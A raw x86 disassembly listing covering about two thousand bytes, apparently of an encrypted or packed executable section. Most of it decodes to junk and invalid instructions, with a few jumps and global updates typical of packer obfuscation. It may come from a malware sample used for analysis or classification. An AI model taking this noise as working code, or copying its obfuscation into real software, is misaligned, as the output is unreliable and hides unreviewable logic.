  402123:	xor    ecx,DWORD PTR [eax-0x7f]
  402126:	pop    ebp
  402127:	lods   eax,DWORD PTR ds:[esi]
  402128:	cwde   
  402129:	and    al,0x1f
  40212b:	jmp    0x4020e7
  40212d:	lods   al,BYTE PTR ds:[esi]
  40212e:	push   ecx
  40212f:	repnz or DWORD PTR [eax-0x77],ebx
  402133:	push   ss
  402134:	pusha  
  402135:	in     eax,dx
  402136:	lds    esi,FWORD PTR [edi-0x1300a4af]
  40213c:	jecxz  0x402107
  40213e:	sub    BYTE PTR [ecx+ebp*2],al
  402141:	popf   
  402142:	inc    ebx
  402143:	jecxz  0x402158
  402145:	neg    DWORD PTR [edx+eax*8]
  402148:	pop    ds
  402149:	adc    eax,0x4c0e4e91
  40214e:	pusha  
  40214f:	mov    ch,BYTE PTR [ebx+0x459e068d]
  402155:	sbb    eax,0xbc07e75c
  40215a:	mov    ebp,0x4ef3b3a2
  40215f:	cmc    
  402160:	inc    edx
  402161:	repnz cmp dl,BYTE PTR [ecx+0xc]
  402165:	mov    dl,0x71
  402167:	pop    ds
  402168:	lock (bad) 
  40216a:	cmp    BYTE PTR [ebx*2+0x1bc2253a],ch
  402171:	mov    ebx,0xef4c01dd
  402176:	mov    edx,0xe4ccacba
  40217b:	mov    eax,ds:0x4c5f3b37
  402180:	cmp    BYTE PTR ds:0x74c874b2,bh
  402186:	xchg   esp,eax
  402187:	dec    esp
  402188:	jnp    0x402195
  40218a:	clc    
  40218b:	and    al,0xf2
  40218d:	out    0x8,al
  40218f:	sbb    ebp,DWORD PTR [ecx-0x6d]
  402192:	lahf   
  402193:	mov    DWORD PTR gs:[ebp-0x4],0xf89c8530
  40219b:	mov    edx,DWORD PTR ds:0x434349
  4021a1:	mov    edx,DWORD PTR [edx]
  4021a3:	sbb    DWORD PTR ds:0x4325f0,edx
  4021a9:	jmp    0x40255f
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	cli    
  4021bb:	mov    bh,0xfd
  4021bd:	int3   
  4021be:	push   edx
  4021bf:	add    al,0x70
  4021c1:	jo     0x40215a
  4021c3:	jge    0x402235
  4021c5:	jo     0x4021bf
  4021c7:	das    
  4021c8:	int3   
  4021c9:	sub    cl,BYTE PTR [esi-0x5c]
  4021cc:	stos   BYTE PTR es:[edi],al
  4021cd:	lods   eax,DWORD PTR ds:[esi]
  4021ce:	outs   dx,BYTE PTR ds:[esi]
  4021cf:	xlat   BYTE PTR ds:[ebx]
  4021d0:	fbstp  TBYTE PTR [edx-0x6b626db2]
  4021d6:	push   ecx
  4021d7:	into   
  4021d8:	dec    ebx
  4021d9:	repnz adc BYTE PTR [esp+edx*1-0xd],bh
  4021de:	mov    ds:0x8ead6a97,al
  4021e3:	lahf   
  4021e4:	push   ss
  4021e5:	rcl    BYTE PTR [ebx-0x53ffb8d8],cl
  4021eb:	js     0x402216
  4021ed:	push   edi
  4021ee:	xchg   esp,eax
  4021ef:	mov    ah,0x38
  4021f1:	in     eax,0x98
  4021f3:	sbb    al,0x62
  4021f5:	add    al,0xc3
  4021f7:	sysexit 
  4021f9:	je     0x402225
  4021fb:	sti    
  4021fc:	jbe    0x4021e0
  4021fe:	jl     0x40223a
  402200:	and    ch,ah
  402202:	inc    ebx
  402203:	in     eax,0x4e
  402205:	lea    ebx,[edi-0x304c518c]
  40220b:	inc    ebp
  40220d:	xor    ebx,DWORD PTR [ebp+edi*2-0x4a1e2f0e]
  402214:	inc    edi
  402215:	xchg   esi,eax
  402216:	add    eax,0xb6e7ec75
  40221b:	repz fdivr QWORD PTR [edx]
  40221e:	fidivr WORD PTR [esi+edx*2+0x50ef3e8e]
  402225:	or     ecx,DWORD PTR [edi-0x143b7d85]
  40222b:	xor    eax,DWORD PTR [esi-0x3c]
  40222e:	inc    esi
  40222f:	call   0x5da0485e
  402234:	je     0x4021e0
  402236:	xor    al,BYTE PTR [ebx+edi*4+0x3186bf7e]
  40223d:	push   edx
  40223e:	repnz mov cl,0xe4
  402241:	ja     0x4021fa
  402243:	lods   al,BYTE PTR ds:[esi]
  402244:	je     0x402259
  402246:	sub    al,0x88
  402248:	mov    ch,0x17
  40224a:	push   ebp
  40224b:	dec    ebx
  40224c:	mov    edx,0x5bdd269c
  402251:	add    esi,DWORD PTR [ebx+0x2e459157]
  402257:	jg     0x4021e4
  402259:	xlat   BYTE PTR ds:[ebx]
  40225a:	imul   BYTE PTR [ebp-0x30]
  40225d:	enter  0xfbfb,0x33
  402261:	adc    al,0x98
  402263:	pop    ds
  402264:	mov    ds:0x47710b4d,al
  402269:	ret    0x91a9
  40226c:	jge    0x40225b
  40226e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40226f:	jmp    0x402268
  402271:	jmp    0x982f3f02
  402276:	mov    gs,edx
  402278:	adc    BYTE PTR [edi],dh
  40227a:	aam    0x6e
  40227c:	pop    eax
  40227d:	popf   
  40227e:	sub    eax,0x3b2be01f
  402283:	jns    0x4022f0
  402285:	jae    0x4022d4
  402287:	mov    ds:0x1e4a6763,eax
  40228c:	add    DWORD PTR [edi-0x541ad6ae],edx
  402292:	cmp    BYTE PTR [ebp-0x410d5392],bh
  402298:	xor    al,0x8e
  40229a:	push   cs
  40229b:	adc    esp,DWORD PTR ds:0x31a489d7
  4022a1:	out    dx,eax
  4022a2:	sbb    BYTE PTR [esi+0x62d2dbbf],al
  4022a8:	and    BYTE PTR [esi-0x3a],cl
  4022ab:	mov    al,ds:0xcf7014ce
  4022b0:	dec    esp
  4022b1:	and    eax,DWORD PTR [edx+ebx*2+0x33]
  4022b5:	in     eax,0xdb
  4022b7:	gs mov al,0x65
  4022ba:	xchg   esp,eax
  4022bb:	or     al,0x74
  4022bd:	imul   eax,ebp,0x72803b0
  4022c3:	push   edx
  4022c4:	mov    ebp,0x14173132
  4022c9:	dec    ecx
  4022ca:	sar    DWORD PTR [ebx+ecx*8-0x3b50e552],cl
  4022d1:	dec    eax
  4022d2:	retf   
  4022d3:	lods   al,BYTE PTR ds:[esi]
  4022d5:	mov    ebp,0xac60d063
  4022da:	fcomp  QWORD PTR [edx+edx*2]
  4022dd:	lahf   
  4022de:	add    eax,DWORD PTR [ebx+0x6bb6448b]
  4022e4:	mov    dl,bh
  4022e6:	mov    ebx,0xe9987adb
  4022eb:	out    0x6f,eax
  4022ed:	add    ah,0xf2
  4022f0:	adc    eax,DWORD PTR [esi]
  4022f2:	mov    eax,ds:0xfd5f4e8f
  4022f7:	sbb    BYTE PTR [ecx+edx*1-0x38301541],bl
  4022fe:	sbb    edi,DWORD PTR ds:0xdfedb5c0
  402304:	and    eax,0x1ccb9b98
  402309:	loope  0x4022b4
  40230b:	fist   DWORD PTR [edi-0x77]
  40230e:	mov    dh,BYTE PTR [eax+0x7b5d7a8a]
  402314:	mov    eax,ds:0xac83ce26
  402319:	into   
  40231a:	mov    fs,WORD PTR [edx]
  40231c:	jmp    0x4022d5
  40231e:	mov    ebp,0x5343b241
  402323:	add    al,0xff
  402325:	lods   eax,DWORD PTR ds:[esi]
  402326:	or     al,0xab
  402328:	je     0x402324
  40232a:	pop    eax
  40232b:	and    al,0x20
  40232d:	cmp    BYTE PTR [esi+0x6c],ah
  402330:	inc    edi
  402331:	jp     0x40232b
  402333:	outs   dx,DWORD PTR ds:[esi]
  402334:	data16 mov cl,0x56
  402337:	sbb    bl,ah
  402339:	mov    ebx,0xf890bb43
  40233e:	xchg   ebx,eax
  40233f:	adc    esp,DWORD PTR [ecx-0x7]
  402342:	aaa    
  402343:	cld    
  402344:	add    bh,cl
  402346:	dec    ebp
  402347:	fsub   QWORD PTR [edx-0x3d]
  40234a:	mov    edx,0x59c95aa6
  40234f:	fbstp  TBYTE PTR [edi]
  402351:	dec    esi
  402352:	fisttp QWORD PTR [esi+0xc]
  402355:	ins    BYTE PTR es:[edi],dx
  402356:	fdiv   DWORD PTR [ecx+0x3a]
  402359:	sub    eax,0xf975f54c
  40235e:	lods   eax,DWORD PTR ds:[esi]
  40235f:	cmp    DWORD PTR [ebx-0x10354219],0x2b
  402366:	test   DWORD PTR [edx],eax
  402368:	ficom  WORD PTR [eax+0x34d3d1c8]
  40236e:	ret    0x8be1
  402371:	add    esp,ebp
  402373:	sqrtps xmm2,XMMWORD PTR [eax]
  402376:	cwde   
  402377:	test   eax,0xcd068159
  40237c:	loop   0x4023af
  40237e:	push   cs
  40237f:	imul   edx,DWORD PTR [ebx],0xffffffff
  402382:	pop    esp
  402383:	sub    BYTE PTR [ecx+0x46],dh
  402386:	jp     0x4023e9
  402388:	sbb    ebx,ebp
  40238a:	fstp   TBYTE PTR [ecx]
  40238c:	and    ecx,eax
  40238e:	cli    
  40238f:	in     eax,dx
  402390:	lds    edx,FWORD PTR [eax]
  402392:	mov    edi,DWORD PTR [edx+eax*1-0x49]
  402396:	neg    edi
  402398:	xor    ch,BYTE PTR [eax+ebp*8-0x6e851921]
  40239f:	push   eax
  4023a0:	and    BYTE PTR ds:0xcae25dac,0x3c
  4023a7:	xchg   esi,eax
  4023a8:	shr    DWORD PTR [eax-0x7f58ae6a],cl
  4023ae:	mov    esp,0x475f32fe
  4023b3:	fwait
  4023b4:	pop    esp
  4023b5:	inc    ebp
  4023b6:	xchg   ecx,ebx
  4023b8:	(bad)  
  4023b9:	jb     0x402353
  4023bb:	stos   BYTE PTR es:[edi],al
  4023bc:	and    DWORD PTR [edx],esi
  4023be:	add    DWORD PTR [esi-0x314d1a83],0x173bd5ed
  4023c8:	loop   0x40234d
  4023ca:	add    al,0xd9
  4023cc:	pop    ebp
  4023cd:	xchg   ebp,eax
  4023ce:	and    BYTE PTR [ebx-0xc],bl
  4023d1:	cmp    al,0x89
  4023d3:	sbb    BYTE PTR [ecx+0x6b625afe],bh
  4023d9:	lds    esp,FWORD PTR [edx-0x36f3f020]
  4023df:	loopne 0x402448
  4023e1:	icebp  
  4023e2:	(bad)  
  4023e3:	out    dx,al
  4023e4:	popa   
  4023e5:	push   0x75412f5c
  4023ea:	test   bl,cl
  4023ec:	ja     0x4023c6
  4023ee:	ja     0x4023f5
  4023f0:	cmp    DWORD PTR [eax],ebx
  4023f2:	into   
  4023f3:	jg     0x402409
  4023f5:	aad    0xa0
  4023f7:	push   edx
  4023f8:	lods   eax,DWORD PTR ds:[esi]
  4023f9:	sbb    al,0x2f
  4023fb:	mov    bh,0x99
  4023fd:	dec    ebx
  4023fe:	xchg   ecx,eax
  4023ff:	xchg   ebp,eax
  402400:	(bad)  
  402401:	sahf   
  402402:	scas   eax,DWORD PTR es:[edi]
  402403:	or     esp,DWORD PTR ds:0xf2e2b93f
  402409:	arpl   cx,cx
  40240b:	mov    ebx,0xae8e771b
  402410:	sbb    DWORD PTR [edi+0x574f8aef],edi
  402416:	mov    WORD PTR ds:0xab71c69e,ss
  40241c:	or     al,0x5a
  40241e:	aad    0x9f
  402420:	mov    ecx,0xa044ed4a
  402425:	mov    esi,0x84c8c387
  40242a:	cmp    cl,BYTE PTR [esi]
  40242c:	mov    ebp,ds
  40242e:	lods   al,BYTE PTR ds:[esi]
  40242f:	xor    DWORD PTR [edx-0x3a],ecx
  402432:	ds stos BYTE PTR es:[edi],al
  402434:	jns    0x402473
  402436:	jle    0x40245c
  402438:	xchg   esi,eax
  402439:	jecxz  0x4023bd
  40243b:	jecxz  0x4024b3
  40243d:	push   0xa622d4d8
  402442:	mov    BYTE PTR [ecx],dl
  402444:	add    esp,esi
  402446:	lock aad 0x40
  402449:	mov    dh,0xb1
  40244b:	sar    BYTE PTR [ebx-0x3fe92bb6],cl
  402451:	lock and BYTE PTR [ebp-0x198d8593],bl
  402458:	leave  
  402459:	stc    
  40245a:	es mov esp,0x1441eaa6
  402460:	enter  0x66e7,0x89
  402464:	fsub   QWORD PTR [esi]
  402466:	inc    eax
  402467:	mov    ecx,0x8a8f334b
  40246c:	add    BYTE PTR [edi-0x320d4eb9],dh
  402472:	add    ch,BYTE PTR [eax-0xf]
  402475:	(bad)  
  402476:	(bad)  
  402477:	retf   0x5eb1
  40247a:	pop    ss
  40247b:	xlat   BYTE PTR ds:[ebx]
  40247c:	(bad)  
  40247d:	mov    ebp,0x53e2dabb
  402482:	ss pop ebp
  402484:	punpckhwd mm3,QWORD PTR [edi+0x6d]
  402488:	(bad)
  40248b:	sub    ebp,DWORD PTR [esi-0x54]
  40248e:	pop    edx
  40248f:	xor    ecx,DWORD PTR [eax+ebp*2]
  402492:	lea    ecx,[ebx+0x30]
  402495:	jne    0x4024b0
  402497:	jmp    0xce086fdc
  40249c:	jecxz  0x40243a
  40249e:	cld    
  40249f:	pop    ebx
  4024a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a1:	inc    esp
  4024a2:	inc    ebp
  4024a3:	idiv   DWORD PTR [eax-0x73]
  4024a6:	clc    
  4024a7:	cdq    
  4024a8:	frstor [edi+0x181510d0]
  4024ae:	mov    edx,0xfc451f1c
  4024b3:	enter  0x867d,0x8b
  4024b7:	xor    esi,edx
  4024b9:	fwait
  4024ba:	push   ebx
  4024bb:	push   cs
  4024bc:	retf   0xa4d3
  4024bf:	push   cs
  4024c0:	sub    ecx,DWORD PTR [edi+0x26]
  4024c3:	out    dx,al
  4024c4:	pop    esp
  4024c5:	je     0x402499
  4024c7:	add    ecx,DWORD PTR [edi]
  4024c9:	sub    DWORD PTR [ebp+0x5e],0x3e272af1
  4024d0:	push   cs
  4024d1:	jl     0x4024e6
  4024d3:	dec    ecx
  4024d4:	add    BYTE PTR ds:0x9a90931d,ah
  4024da:	and    al,0x3b
  4024dc:	mov    ah,0x50
  4024de:	enter  0x4c9f,0xfe
  4024e2:	mov    ecx,0x449bf4b
  4024e7:	mov    al,0xe5
  4024e9:	ds retf 
  4024eb:	mov    esi,DWORD PTR [ecx+0x1727d49c]
  4024f1:	dec    ebp
  4024f2:	das    
  4024f3:	sbb    eax,esi
  4024f5:	cmp    eax,0x9a390928
  4024fa:	and    al,cl
  4024fc:	jns    0x4024e2
  4024fe:	adc    eax,0xbaf77fe0
  402503:	ja     0x40251f
  402505:	pusha  
  402506:	push   ebx
  402507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402508:	ja     0x4024f6
  40250a:	lahf   
  40250b:	mov    al,ds:0x8da89d94
  402510:	cmp    ecx,DWORD PTR [ebp-0x32d9b29]
  402516:	test   al,0xb1
  402518:	mov    BYTE PTR ds:[esi-0x3b],ah
  40251c:	push   edi
  40251d:	ins    BYTE PTR es:[edi],dx
  40251e:	mov    edi,0xac8b6947
  402523:	(bad)  
  402524:	jnp    0x40253c
  402526:	ret    0x4103
  402529:	adc    al,ch
  40252b:	pop    esp
  40252c:	outs   dx,BYTE PTR ds:[esi]
  40252d:	pop    edi
  40252e:	dec    ebp
  40252f:	xor    ch,ah
  402531:	inc    esi
  402532:	retf   
  402533:	or     dl,BYTE PTR [esi]
  402535:	fild   QWORD PTR [ebp-0x5d989600]
  40253b:	rol    BYTE PTR [edx+0x638a2023],0xdb
  402542:	pop    edx
  402543:	sub    eax,0xdc1a2434
  402548:	adc    al,BYTE PTR [edx-0x2da5c009]
  40254e:	stc    
  40254f:	mov    esi,0x58e8e2b
  402554:	inc    esi
  402555:	add    esi,esp
  402557:	cmp    eax,eax
  402559:	xchg   ebp,eax
  40255a:	jb     0x4024f4
  40255c:	or     DWORD PTR [esi+0x7d],eax
  40255f:	mov    edx,DWORD PTR [ebp-0x8]
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4325f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432cd2,0x4325f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	sub    edx,DWORD PTR [esi]
  4025a4:	sub    edx,ebx
  4025a6:	jmp    0x97b095ab
  4025ab:	jge    0x40261d
  4025ad:	jo     0x402543
  4025af:	push   eax
  4025b0:	scas   eax,DWORD PTR es:[edi]
  4025b1:	cmp    ah,BYTE PTR [edi+0x79758772]
  4025b7:	dec    esp
  4025b8:	shr    DWORD PTR [ecx+0x19],cl
  4025bb:	pop    ds
  4025bc:	(bad)  
  4025bd:	cs and eax,0x8ad590cd
  4025c3:	das    
  4025c4:	sub    DWORD PTR [esi-0x50],edx
  4025c7:	fidivr WORD PTR [ebx-0x5e]
  4025ca:	push   es
  4025cb:	aam    0x83
  4025cd:	mov    bh,0xca
  4025cf:	cmc    
  4025d0:	das    
  4025d1:	out    0x96,al
  4025d3:	mov    ch,BYTE PTR [esp+eax*1]
  4025d6:	call   0xc359cfc6
  4025db:	inc    edx
  4025dc:	mov    al,0x7e
  4025de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025df:	xor    ah,BYTE PTR [eax]
  4025e1:	test   al,0xe5
  4025e3:	ja     0x40262d
  4025e5:	pop    ebp
  4025e6:	sub    al,0x59
  4025e8:	mov    edx,0x4afe95ba
  4025ed:	shl    DWORD PTR [edx],1
  4025ef:	xor    bl,bl
  4025f1:	and    edi,edi
  4025f3:	cmp    bh,BYTE PTR [ecx-0x66bc4f5a]
  4025f9:	inc    esp
  4025fa:	and    ch,ah
  4025fc:	lea    ebx,[ebp+0x4e5c08a0]
  402602:	repz mov ch,0x9a
  402605:	lds    eax,FWORD PTR [edi]
  402607:	pop    ebx
  402608:	ds adc al,0x71
  40260b:	imul   esi,DWORD PTR [ebp-0x33964588],0xe17c805b
  402615:	gs std 
  402617:	inc    ecx
  402618:	pop    es
  402619:	repnz gs ss dec eax
  40261d:	dec    eax
  40261e:	mov    DWORD PTR [edi+0x224ad602],eax
  402624:	fs inc esp
  402626:	and    ch,dl
  402628:	scas   eax,DWORD PTR es:[edi]
  402629:	(bad)  
  40262a:	mov    edx,0xa1e0f3f6
  40262f:	sub    BYTE PTR [ebp+0x2b],bl
  402632:	jg     0x402623
  402634:	rcr    BYTE PTR [ebp+0x77],0xec
  402638:	bound  esp,QWORD PTR [ebp+0x1c]
  40263b:	and    DWORD PTR [esi],ecx
  40263d:	cmp    esp,ebx
  40263f:	pop    eax
  402640:	loopne 0x40262f
  402642:	ret    
  402643:	ins    BYTE PTR es:[edi],dx
  402644:	ins    BYTE PTR es:[edi],dx
  402645:	inc    eax
  402646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402647:	mov    eax,ds:0xa8e9011b
  40264c:	pusha  
  40264d:	cdq    
  40264e:	add    ax,0xd22b
  402652:	packssdw mm0,QWORD PTR [edx]
  402655:	adc    DWORD PTR [ecx-0x7f10f2a8],edi
  40265b:	adc    BYTE PTR [ecx*4-0x375af5aa],al
  402662:	sti    
  402663:	dec    edi
  402664:	add    BYTE PTR [esi+0x44f26b3b],cl
  40266a:	jns    0x40263a
  40266c:	outs   dx,BYTE PTR ds:[esi]
  40266d:	fdiv   QWORD PTR [ebp+0xa87f36a]
  402673:	ins    BYTE PTR es:[edi],dx
  402674:	mov    dh,0x3c
  402676:	pop    edx
  402677:	sub    DWORD PTR [edx+0x17851d22],ecx
  40267d:	push   ebp
  40267e:	inc    ebx
  40267f:	gs je  0x4026af
  402682:	lds    esi,FWORD PTR [esi-0x7a9d31d]
  402688:	sub    eax,0xb744b498
  40268d:	pusha  
  40268e:	adc    DWORD PTR [ebx+0x28245b99],esp
  402694:	loope  0x4026fc
  402696:	adc    BYTE PTR [ebx+eiz*8-0x70],al
  40269a:	cs ss jae 0x402624
  40269e:	shr    BYTE PTR [ebp-0x123a5143],1
  4026a4:	push   ds
  4026a5:	adc    eax,0x15ae581a
  4026aa:	cmp    cl,cl
  4026ac:	and    ah,0xa1
  4026af:	jmp    0x40263f
  4026b1:	(bad)  
  4026b2:	lock jl 0x402639
  4026b5:	sub    al,0x82
  4026b7:	inc    ebx
  4026b8:	and    al,0x99
  4026ba:	sub    eax,0x300704f9
  4026bf:	sbb    BYTE PTR [ecx-0x1e17fd5d],bl
  4026c5:	leave  
  4026c6:	std    
  4026c7:	cmc    
  4026c8:	and    BYTE PTR [edx+edi*4-0x5d],ah
  4026cc:	fwait
  4026cd:	xor    ebp,DWORD PTR [eax+esi*8+0x322c5ff5]
  4026d4:	cmp    edi,DWORD PTR [eax+0x113471d]
  4026da:	pop    esp
  4026db:	jnp    0x40270c
  4026dd:	push   ebp
  4026de:	push   ebp
  4026df:	in     eax,dx
  4026e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026e1:	aas    
  4026e2:	xchg   BYTE PTR ds:0xdbec52b1,bl
  4026e8:	sbb    bl,al
  4026ea:	mov    ebx,0xb756e1ae
  4026ef:	imul   eax,DWORD PTR [eax],0x958f145c
  4026f5:	push   0xe7006043
  4026fa:	imul   BYTE PTR [ebx+0x68efba88]
  402700:	push   ds
  402701:	(bad)  
  402702:	or     DWORD PTR [ebx+esi*8],ecx
  402705:	jo     0x4026c9
  402707:	mov    cl,0xac
  402709:	fnsave [ebx]
  40270b:	dec    edx
  40270c:	inc    esi
  40270d:	pop    eax
  40270e:	dec    ebx
  40270f:	test   eax,0x2f245d64
  402714:	pushf  
  402715:	adc    ah,BYTE PTR [ecx+0x64a1d69e]
  40271b:	(bad)
  40271f:	fdiv   QWORD PTR [edi]
  402721:	scas   al,BYTE PTR es:[edi]
  402722:	std    
  402723:	inc    esi
  402724:	out    dx,al
  402725:	nop
  402726:	push   esi
  402727:	(bad)  
  402728:	mov    ebx,0xf7482d9a
  40272d:	xor    DWORD PTR [edi],esp
  40272f:	fcmovb st,st(5)
  402731:	out    0xd6,eax
  402733:	push   0xdcf3dd36
  402738:	push   esi
  402739:	xor    ebp,DWORD PTR [ecx-0x4c]
  40273c:	sbb    al,0x4
  40273e:	push   0x3c2b4b26
  402743:	sahf   
  402744:	xchg   edx,eax
  402745:	jg     0x402773
  402747:	dec    edi
  402748:	enter  0x7dd7,0x41
  40274c:	inc    ebx
  40274d:	in     eax,0x8d
  40274f:	fnstcw WORD PTR [esi+edi*8-0x5b163ff5]
  402756:	jge    0x4026f2
  402758:	pop    eax
  402759:	fimul  WORD PTR [eax+0x52f56563]
  40275f:	push   0x7c
  402761:	adc    al,0x10
  402763:	pop    esp
  402764:	stos   BYTE PTR es:[edi],al
  402765:	adc    eax,0xd749bcf6
  40276a:	lods   al,BYTE PTR ds:[esi]
  40276b:	out    0x36,al
  40276d:	stc    
  40276e:	arpl   WORD PTR [eax],di
  402770:	mov    ds:0x63dfe84c,eax
  402775:	jbe    0x4027b7
  402777:	mov    bl,0x9d
  402779:	out    0xbc,al
  40277b:	xchg   edx,eax
  40277c:	xor    ecx,DWORD PTR [ebp+0x2b]
  40277f:	pushf  
  402780:	jne    0x402774
  402782:	or     BYTE PTR [edi+0x2c],ch
  402785:	fcmovnbe st,st(0)
  402787:	dec    eax
  402788:	je     0x402802
  40278a:	cli    
  40278b:	jl     0x402756
  40278d:	ins    BYTE PTR es:[edi],dx
  40278e:	adc    dl,BYTE PTR [edx+0x7a5deab1]
  402794:	sahf   
  402795:	dec    ebx
  402796:	push   0x61465937
  40279b:	test   BYTE PTR [esi+0x1e],dh
  40279e:	or     DWORD PTR ds:0x3880c43,ecx
  4027a4:	jno    0x4027a7
  4027a6:	mov    WORD PTR [esi-0x16],ss
  4027a9:	mov    esi,0xfe030d61
  4027ae:	leave  
  4027af:	and    BYTE PTR [edx+ecx*4],ch
  4027b2:	sbb    BYTE PTR [eax+0x52],cl
  4027b5:	retf   0x6d8c
  4027b8:	sub    cl,BYTE PTR [edi*1+0x543361e8]
  4027bf:	idiv   ch
  4027c1:	inc    ebp
  4027c2:	jnp    0x402813
  4027c4:	push   ebp
  4027c5:	out    dx,eax
  4027c6:	cmp    DWORD PTR [ebx+0x412649c],esp
  4027cc:	in     eax,dx
  4027cd:	sub    BYTE PTR [eax+0x6e1d2860],0xfa
  4027d4:	test   BYTE PTR [eax],al
  4027d6:	ret    0x6a8
  4027d9:	pop    ss
  4027da:	stos   DWORD PTR es:[edi],eax
  4027db:	retf   0x5ece
  4027de:	lods   eax,DWORD PTR ds:[esi]
  4027df:	test   ebx,0x94797086
  4027e5:	xor    edi,0x6d
  4027e8:	or     cl,ah
  4027ea:	in     al,0xf1
  4027ec:	or     esp,DWORD PTR [edx]
  4027ee:	mov    edx,0xb797c1c9
  4027f3:	in     al,0x53
  4027f5:	push   ebp
  4027f6:	ja     0x40279a
  4027f8:	inc    edi
  4027f9:	repnz hlt 
  4027fb:	adc    bl,0x5e
  4027fe:	and    DWORD PTR [edi+0x0],ebx
  402801:	and    eax,0x7a67ace6
  402806:	and    eax,0x87cb9ee9
  40280b:	(bad)
  40280e:	call   DWORD PTR [ecx]
  402810:	push   ebx
  402811:	mov    ah,0x41
  402813:	adc    eax,0xffffffa3
  402816:	or     eax,0xf33480de
  40281b:	pop    ds
  40281c:	rcr    BYTE PTR [eax-0x44c8341e],cl
  402822:	lds    ebx,FWORD PTR [esi]
  402824:	sti    
  402825:	cmp    esp,ebx
  402827:	loop   0x402854
  402829:	test   DWORD PTR [ebp+0x6947a112],esp
  40282f:	mov    bh,0xd4
  402831:	inc    ebp
  402832:	pusha  
  402833:	test   eax,0xaf07793d
  402838:	nop
  402839:	std    
  40283a:	pop    ds
  40283b:	sahf   
  40283c:	cmp    eax,0xab1fc463
  402841:	into   
  402842:	fnstenv [ebx-0x8]
  402845:	dec    eax
  402846:	repnz loopne 0x402815
  402849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40284a:	test   esp,edi
  40284c:	pop    ebx
  40284d:	repz xor eax,eax
  402850:	fadd   QWORD PTR [edx-0x18a800e1]
  402856:	idiv   ebx
  402858:	add    eax,0xc2b2b43d
  40285d:	or     cl,BYTE PTR [eax+0x1c]
  402860:	cmp    al,0xf5
  402862:	or     eax,0xa2a0e42c
  402867:	(bad)
  40286b:	pop    ecx
  40286c:	lods   eax,DWORD PTR ds:[esi]
  40286d:	lods   eax,DWORD PTR ds:[esi]
  40286e:	jl     0x402840
  402870:	mov    ch,0xf3
  402872:	dec    esp
  402873:	push   0x103c0a0
  402878:	aad    0xaa
  40287a:	sahf   
  40287b:	test   DWORD PTR [esp-0x498c0960],ebp
  402882:	clc    
  402883:	pusha  
  402884:	out    0x4d,eax
  402886:	jne    0x4028f4
  402888:	ss xor ah,dl
  40288b:	fnstsw WORD PTR [esi+ebp*1+0x2e]
  40288f:	push   edx
  402890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402891:	jno    0x4028e9
  402893:	jge    0x402900
  402895:	xchg   esi,eax
  402896:	loope  0x40287b
  402898:	hlt    
  402899:	sub    al,al
  40289b:	sbb    ecx,DWORD PTR [esi-0x1b2fb38f]
  4028a1:	sbb    BYTE PTR ds:0x2870421b,bl
  4028a7:	inc    esp
  4028a8:	out    0x63,eax
  4028aa:	pop    ebx
  4028ab:	mov    edi,0xadb065d2
  4028b0:	jno    0x40286f
  4028b2:	adc    al,0x1
  4028b4:	repnz mov dl,0x8d
  4028b7:	push   0xffffffba
  4028b9:	(bad)  
  4028ba:	enter  0x9420,0x17
  4028be:	and    eax,0xfc7b0df4
  4028c3:	mov    WORD PTR [ebp-0x28],cs
  4028c6:	sub    BYTE PTR [edi-0x6c73c42f],ch
  4028cc:	hlt    
  4028cd:	nop
  4028ce:	xchg   DWORD PTR [ecx+0x7770547d],edi
  4028d4:	xchg   esi,eax
  4028d5:	cli    
  4028d6:	shl    DWORD PTR [ecx-0x42b629ab],cl
  4028dc:	or     al,0x98
  4028de:	xchg   esp,eax
  4028df:	pop    ecx
  4028e0:	mov    esi,0x784e1534
  4028e5:	in     al,dx
  4028e6:	es int 0x2b
  4028e9:	xor    al,0x4c
  4028eb:	out    dx,eax
  4028ec:	jg     0x402939
  4028ee:	std    
  4028ef:	pop    edx
  4028f0:	jg     0x402946
  4028f2:	jp     0x40287d
  4028f4:	dec    ecx
  4028f5:	jae    0x402963
  4028f7:	addr16 popf 
  4028f9:	mov    eax,0x81d3ff15
  4028fe:	push   eax
  4028ff:	scas   eax,DWORD PTR es:[edi]
  402900:	rcr    dh,1
  402902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402903:	cdq    
  402904:	pushf  
  402905:	fdiv   QWORD PTR [edi]
  402907:	dec    ecx
  402908:	sahf   
  402909:	dec    edi
  40290a:	int3   
  40290b:	and    al,0xe1
  40290d:	mov    fs,WORD PTR [esi-0x1e465592]
  402913:	ins    DWORD PTR es:[edi],dx
  402914:	(bad)  
  402915:	push   ebx
  402916:	(bad)  
  402917:	out    0x69,al
  402919:	jae    0x402926
  40291b:	push   eax
  40291c:	fidiv  DWORD PTR ds:0xa853
  402921:	sbb    eax,0x7c32e523
  402926:	adc    BYTE PTR [edx],dl
  402928:	mov    ebx,0xe4937a6b
  40292d:	jle    0x40292a
  40292f:	(bad)  
  402930:	int3   
  402931:	test   eax,0x47726bb5
  402936:	retf   0x2bcd
  402939:	jae    0x402971
  40293b:	pop    es
  40293c:	pop    edx
  40293d:	inc    ebx
  40293e:	xchg   ebp,eax
  40293f:	mov    ds:0x8e96e36f,eax
  402944:	cmp    eax,DWORD PTR [edx-0x3805c457]
  40294a:	add    eax,0x434292
